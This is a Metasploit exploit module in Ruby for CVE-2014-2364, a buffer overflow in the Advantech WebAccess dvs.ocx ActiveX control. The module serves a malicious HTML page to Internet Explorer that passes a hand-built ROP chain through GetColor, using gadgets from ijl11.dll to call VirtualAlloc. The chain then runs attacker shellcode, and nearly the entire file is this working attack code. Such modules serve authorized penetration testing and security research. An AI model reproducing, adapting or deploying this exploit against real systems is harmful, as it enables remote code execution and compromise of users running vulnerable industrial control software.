##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit3 < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::BrowserExploitServer

  def initialize(info = {})
    super(update_info(info,
      'Name'                => 'Advantech WebAccess dvs.ocx GetColor 
Buffer Overflow',
      'Description'         => %q{
        This module exploits a buffer overflow vulnerability in Advantec 
WebAccess. The
        vulnerability exists in the dvs.ocx ActiveX control, where a 
dangerous call to
        sprintf can be reached with user controlled data through the 
GetColor function.
        This module has been tested successfully on Windows XP SP3 with 
IE6 and Windows
        7 SP1 with IE8 and IE 9.
      },
      'License'             => MSF_LICENSE,
      'Author'              =>
        [
          'Unknown', # Vulnerability discovery
          'juan vazquez' # Metasploit module
        ],
      'References'          =>
        [
          ['CVE', '2014-2364'],
          ['ZDI', '14-255'],
          ['URL', 
'http://ics-cert.us-cert.gov/advisories/ICSA-14-198-02']
        ],
      'DefaultOptions'      =>
        {
          'Retries'              => false,
          'InitialAutoRunScript' => 'migrate -f'
        },
      'BrowserRequirements' =>
        {
          :source  => /script|headers/i,
          :os_name => Msf::OperatingSystems::WINDOWS,
          :ua_name => /MSIE/i,
          :ua_ver  => lambda { |ver| Gem::Version.new(ver) <  
Gem::Version.new('10') },
          :clsid   => "{5CE92A27-9F6A-11D2-9D3D-000001155641}",
          :method  => "GetColor"
        },
      'Payload'             =>
        {
          'Space'           => 1024,
          'DisableNops'     => true,
          'BadChars'        => "\x00\x0a\x0d\x5c",
          # Patch the stack to execute the decoder...
          'PrependEncoder'  => "\x81\xc4\x9c\xff\xff\xff", # add esp, 
-100
          # Fix the stack again, this time better :), before the payload
          # is executed.
          'Prepend'         => "\x64\xa1\x18\x00\x00\x00" + # mov eax, 
fs:[0x18]
                               "\x83\xC0\x08"             + # add eax, 
byte 8
                               "\x8b\x20"                 + # mov esp, 
[eax]
                               "\x81\xC4\x30\xF8\xFF\xFF"  # add esp, 
-2000
        },
      'Platform'            => 'win',
      'Arch'                => ARCH_X86,
      'Targets'             =>
        [
          [ 'Automatic', { } ]
        ],
      'DefaultTarget'       => 0,
      'DisclosureDate'      => 'Jul 17 2014'))
  end

  def on_request_exploit(cli, request, target_info)
    print_status("Requested: #{request.uri}")

    content = <<-EOS
<html>
<head>
<meta http-equiv="cache-control" content="max-age=0" />
<meta http-equiv="cache-control" content="no-cache" />
<meta http-equiv="expires" content="0" />
<meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
<meta http-equiv="pragma" content="no-cache" />
</head>
<body>
<object classid='clsid:5CE92A27-9F6A-11D2-9D3D-000001155641' id='test' 
/></object>
<script language='javascript'>
test.GetColor("#{rop_payload(get_payload(cli, target_info))}", 0);
</script>
</body>
</html>
    EOS

    print_status("Sending #{self.name}")
    send_response_html(cli, content, {'Pragma' => 'no-cache'})
  end

  # Uses gadgets from ijl11.dll 1.1.2.16
  def rop_payload(code)
    xpl = rand_text_alphanumeric(61) # offset
    xpl << [0x60014185].pack("V")    # RET
    xpl << rand_text_alphanumeric(8)

    # EBX = dwSize (0x40)
    xpl << [0x60012288].pack("V") # POP ECX # RETN
    xpl << [0xffffffff].pack("V") # ecx value
    xpl << [0x6002157e].pack("V") # POP EAX # RETN
    xpl << [0x9ffdafc9].pack("V") # eax value
    xpl << [0x60022b97].pack("V") # ADC EAX,60025078 # RETN
    xpl << [0x60024ea4].pack("V") # MUL EAX,ECX # RETN 0x10
    xpl << [0x60018084].pack("V") # POP EBP # RETN
    xpl << rand_text_alphanumeric(4) # padding
    xpl << rand_text_alphanumeric(4) # padding
    xpl << rand_text_alphanumeric(4) # padding
    xpl << rand_text_alphanumeric(4) # padding
    xpl << [0x60029f6c].pack("V") # .data ijl11.dll
    xpl << [0x60012288].pack("V") # POP ECX # RETN
    xpl << [0x60023588].pack("V") # ECX => (&POP EBX # RETN)
    xpl << [0x6001f1c8].pack("V") # push edx # or al,39h # push ecx # or 
byte ptr [ebp+5], dh # mov eax, 1 # ret
    # EDX = flAllocationType (0x1000)
    xpl << [0x60012288].pack("V") # POP ECX # RETN
    xpl << [0xffffffff].pack("V") # ecx value
    xpl << [0x6002157e].pack("V") # POP EAX # RETN
    xpl << [0x9ffdbf89].pack("V") # eax value
    xpl << [0x60022b97].pack("V") # ADC EAX,60025078 # RETN
    xpl << [0x60024ea4].pack("V") # MUL EAX,ECX # RETN 0x10
    # ECX = flProtect (0x40)
    xpl << [0x6002157e].pack("V") # POP EAX # RETN
    xpl << rand_text_alphanumeric(4) # padding
    xpl << rand_text_alphanumeric(4) # padding
    xpl << rand_text_alphanumeric(4) # padding
    xpl << rand_text_alphanumeric(4) # padding
    xpl << [0x60029f6c].pack("V") # .data ijl11.dll
    xpl << [0x60012288].pack("V") # POP ECX # RETN
    xpl << [0xffffffff].pack("V") # ecx value
    0x41.times do
      xpl << [0x6001b8ec].pack("V") # INC ECX # MOV DWORD PTR 
DS:[EAX],ECX # RETN
    end
    # EAX = ptr to &VirtualAlloc()
    xpl << [0x6001db7e].pack("V") # POP EAX # RETN [ijl11.dll]
    xpl << [0x600250c8].pack("V") # ptr to &VirtualAlloc() [IAT 
ijl11.dll]
    # EBP = POP (skip 4 bytes)
    xpl << [0x6002054b].pack("V") # POP EBP # RETN
    xpl << [0x6002054b].pack("V") # ptr to &(# pop ebp # retn)
    # ESI = ptr to JMP [EAX]
    xpl << [0x600181cc].pack("V") # POP ESI # RETN
    xpl << [0x6002176e].pack("V") # ptr to &(# jmp[eax])
    # EDI = ROP NOP (RETN)
    xpl << [0x60021ad1].pack("V") # POP EDI # RETN
    xpl << [0x60021ad2].pack("V") # ptr to &(retn)
    # ESP = lpAddress (automatic)
    # PUSHAD # RETN
    xpl << [0x60018399].pack("V") # PUSHAD # RETN
    xpl << [0x6001c5cd].pack("V") # ptr to &(# push esp # retn)
    xpl << code

    xpl.gsub!("\"", "\\\"") # Escape double quote, to not break 
javascript string
    xpl.gsub!("\\", "\\\\") # Escape back slash, to avoid javascript 
escaping

    xpl
  end

end
